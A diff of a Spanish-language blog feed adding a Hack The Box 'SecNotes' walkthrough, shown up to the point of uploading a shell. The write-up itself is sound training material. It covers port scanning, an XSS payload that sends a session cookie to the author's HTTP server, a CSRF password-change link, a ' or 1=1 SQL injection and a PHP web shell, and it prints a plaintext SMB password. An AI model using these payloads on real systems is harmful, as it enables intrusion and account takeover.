@@ -1,4 +1,478 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-16T22:41:25-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Shocker</title><link href="http://localhost:4000/htb-shocker/" rel="alternate" type="text/html" title="Hack The Box Shocker" /><published>2021-12-16T00:00:00-06:00</published><updated>2021-12-16T00:00:00-06:00</updated><id>http://localhost:4000/htb-shocker</id><content type="html" xml:base="http://localhost:4000/htb-shocker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-shocker/banner-shocker.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-26T20:01:53-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box SecNotes</title><link href="http://localhost:4000/htb-secnotes/" rel="alternate" type="text/html" title="Hack The Box SecNotes" /><published>2021-12-26T00:00:00-06:00</published><updated>2021-12-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-secnotes</id><content type="html" xml:base="http://localhost:4000/htb-secnotes/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/banner-secnotes.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;secnotes&quot;&gt;SecNotes&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.97.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.97
+PING 10.10.10.97 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.97&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.97: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;508 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.97 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 508.005/508.005/508.005/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-17 22:14 CST
+Initiating SYN Stealth Scan at 22:14
+Scanning 10.10.10.97 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 445/tcp on 10.10.10.97
+Discovered open port 80/tcp on 10.10.10.97
+Discovered open port 8808/tcp on 10.10.10.97
+Completed SYN Stealth Scan at 22:15, 26.97s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.97
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-12-17 22:14:54 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT     STATE SERVICE       REASON
+80/tcp   open  http          syn-ack ttl 127
+445/tcp  open  microsoft-ds  syn-ack ttl 127
+8808/tcp open  ssports-bcast syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.25 seconds
+           Raw packets sent: 131085 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;924B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.97
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,445,8808
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,445,8808 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-17 22:16 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.97
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8808/tcp open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: Host: SECNOTES&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 10 Enterprise 17134 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows 10 Enterprise 6.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Workgroup: HTB&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-17T20:21:44-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-12-18T04:21:45
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 2h45m01s, deviation: 4h37m09s, median: 4m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;59.46 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos puertos que presentan el servicio HTTP, por lo que antes de ingresar vía web, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.97/
+http://10.10.10.97/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
+http://10.10.10.97/login.php &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]
+❯ whatweb http://10.10.10.97:8808/
+http://10.10.10.97:8808/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.97], Microsoft-IIS[10.0], Title[IIS Windows]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que para el puerto 80 nos hace una redirección al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt; y poca cosa más de valor que nos pueda servir hasta el momento. Ahora si vamos a echarles un ojo vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Antes de probar cosas, notamos que podemos registrarnos, así que es lo que haremos primero y posteriormente vamos a tratar de ingresar con nuestras credenciales.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le damos click en el botón &lt;strong&gt;&lt;em&gt;Sign Out&lt;/em&gt;&lt;/strong&gt; y ahora vamos a hacer unas pruebas en el panel de login, como ya contamos con unas credenciales válidas de acceso (las nuestras), vamos a colocar el usuario y una contraseña incorrecta para ver que pasa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos que nos dice que la contraseña es incorrecta, es decir, nos está validando el usuario y lo toma como bueno. Si recordamos que al acceder correctamente nos aparece un banner que nos dice que podríamos contactar con el usuario &lt;strong&gt;tyler&lt;/strong&gt;; así que vamos a probar si dicho usuario existe en el panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el usuario existe, por lo que tenemos un usuario potencial a comprometer y podría tener algunos modulos de administrator con los cuales no contamos en nuestra cuenta que creamos. Ahora, analizando un poco el sitio web, vemos que podemos crear una nota, asi que trataremos de injectar código:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos hacer injecciones html, vamos a tratar ahora &lt;strong&gt;&lt;em&gt;XSS (Cross Site Scripting)&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, con nuestro pluggin &lt;strong&gt;Edit this cookie&lt;/strong&gt; vemos que tenemos una cookie llamanda &lt;strong&gt;PHPSESSID&lt;/strong&gt; asociada a nuestra sessión. Por lo tanto, ya debemos estar pensando en un ataque de &lt;strong&gt;&lt;em&gt;Cookie Hijacking&lt;/em&gt;&lt;/strong&gt; del usuario &lt;strong&gt;Tyler&lt;/strong&gt;; pero antes que de eso, vamos a validar si podemos hacerlo, así que creamos una nueva nota en donde trataremos de acceder a una imagen de un servidor HTTP (debemos compartir un servidor HTTP con python) y que nos nuestre la cookie de la sessión:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.14.27 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21/Dec/2021 21:38:00] code 404, message File not found
+10.10.14.27 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21/Dec/2021 21:38:00] &lt;span class=&quot;s2&quot;&gt;&quot;GET /kamiyo.jpg?cookie=PHPSESSID=oj8st60s6e5jr4bvl102j44dgv HTTP/1.1&quot;&lt;/span&gt; 404 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos nuestra cookie de sessión, por lo tanto vamos a mandar la misma injección al usuario &lt;strong&gt;Tyler&lt;/strong&gt; en el apartado de &lt;strong&gt;Contact Us&lt;/strong&gt;. Sin embargo, no vemos una respuesta por parte del usuario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analizando un poco el sitio web, en el apartado de &lt;strong&gt;Change Password&lt;/strong&gt; vemos que la solicitud viaja mediante el método POST; sin embargo, es posible que admita el método GET y una forma de probarlo sería agregando los parámetros en la URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.97/change_pass.php?password=hola123&amp;amp;confirm_password=hola123&amp;amp;submit=submit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y nos dice que el password ha sido actualizado, por lo tanto podríamos probar de mandar dicha dirección URL al usuario &lt;strong&gt;Tyler&lt;/strong&gt; para que cambie su propia contraseña a una que nosotros conozcamos y podemos acceder a su cuenta. Para validar que ha dado click en el enlace, vamos a compartirnos un servidor HTTP con python de manera adicional.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.97 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21/Dec/2021 21:55:42] code 404, message File not found
+10.10.10.97 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21/Dec/2021 21:55:42] &lt;span class=&quot;s2&quot;&gt;&quot;GET /tyler_pwned HTTP/1.1&quot;&lt;/span&gt; 404 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y a este punto la contraseña del usuario &lt;strong&gt;Tyler&lt;/strong&gt; ha sido modificada por &lt;strong&gt;hola123&lt;/strong&gt;, vamos a validarlo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Otra forma de acceder a una cuenta privilegiada es mediante una injección SQL en el panel de registro ingresando como nombre de usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1-- -&lt;/code&gt; y lo mismo de contraseña.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ingresamos como nuestro nuevo usuario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos la notas de todos los usuarios, incluyendo las de &lt;strong&gt;Tyler&lt;/strong&gt; en donde tenemos unas credenciales de acceso bajo la nota &lt;strong&gt;new site&lt;/strong&gt; y como pista nos dan la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secnotes.htb\new-site&lt;/code&gt;; por lo que ya debemos estar pensando en acceso por el servicio de SMB, por lo que primero trataremos de ver recursos a con una &lt;strong&gt;Null Session&lt;/strong&gt; y después con las credenciales que nos dá la página.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+session setup failed: NT_STATUS_ACCESS_DENIED
+❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tyler'&lt;/span&gt;
+Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;s1&quot;&gt;'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        new-site        Disk      
+SMB1 disabled -- no workgroup available
+❯ smbmap -u '&lt;/span&gt;tyler&lt;span class=&quot;s1&quot;&gt;' -p '&lt;/span&gt;92g!mA8BGjOirkL%OG&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&amp;amp;&lt;span class=&quot;s1&quot;&gt;' -H 10.10.10.97
+[+] IP: 10.10.10.97:445 Name: secnotes.htb                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        new-site                                                READ, WRITE
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;new-site&lt;/code&gt;, por lo que vamos a ingresar y ver que información encontramos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.97/new-site &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tyler'&lt;/span&gt;
+Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;s1&quot;&gt;'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Sun Aug 19 13:06:14 2018
+  ..                                  D        0  Sun Aug 19 13:06:14 2018
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+
+                7736063 blocks of size 4096. 3396336 blocks available
+smb: \&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos archivos asociados a un sitio web y además contamos con permisos de escritura; por lo que ya debemos estar pensando en subir un archivo aspx malicioso que nos permite la ejecución de código remoto; por lo tanto vamos a crear un archivo de prueba y tratar de verlo vía web por el puerto 8808:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Esto es una prueba&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.txt
+❯ smbclient //10.10.10.97/new-site &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'tyler'&lt;/span&gt;
+Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;s1&quot;&gt;'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; put test.txt
+putting file test.txt as \test.txt (0.0 kb/s) (average 1.7 kb/s)
+smb: \&amp;gt; dir
+  .                                   D        0  Sun Dec 26 18:26:26 2021
+  ..                                  D        0  Sun Dec 26 18:26:26 2021
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+  test.txt                            A       19  Sun Dec 26 18:26:27 2021
+
+                7736063 blocks of size 4096. 3396794 blocks available
+smb: \&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a verlo vía web:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como el sitio web nos interpreta archivos php, podemos crear nuestro archivo php que nos permita la ejecución de comandos a nivel de sistema y lo subimos al sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put shell.php
